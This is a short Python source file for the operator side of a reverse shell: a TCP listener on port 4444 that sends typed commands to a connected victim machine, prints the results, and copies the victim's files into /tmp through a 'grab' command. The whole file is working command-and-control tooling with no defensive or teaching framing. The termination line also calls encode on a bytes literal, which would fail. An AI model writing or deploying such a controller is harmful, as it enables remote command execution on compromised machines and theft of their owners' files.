import os,socket

def transfer(conn, command):
    conn.send(command.encode())
    grab , path = command.split('*')
    f = open('/tmp/'+path, 'wb')
    while 1:
        bits = conn.recv(1024)
        if bits.endswith('DONE'.encode()):
            f.write(bits[:-4])
            f.close()
            print('[+] Transfer completed')
            break
        if 'File not found'.encode() in bits:
            print('[-] unable to find out the file')
            break
        f.write(bits)
def connect():
    s = socket.socket()
    s.bind(('127.0.0.1', 4444))
    s.listen(1)
    print('[+] Listening for income TCP connection')
    conn , addr = s.accept()
    print('[+] we got a connection')
    while 1:
        command = input('SHELL>> ')
        if 'terminate' in command:
            conn.send(b'terminate'.encode())
            conn.close()
            break
        elif 'grab' in command:
            transfer(conn,command)
        else:
            conn.send(command.encode())
            print(conn.recv(1024).decode())

def main():
    connect()

main()
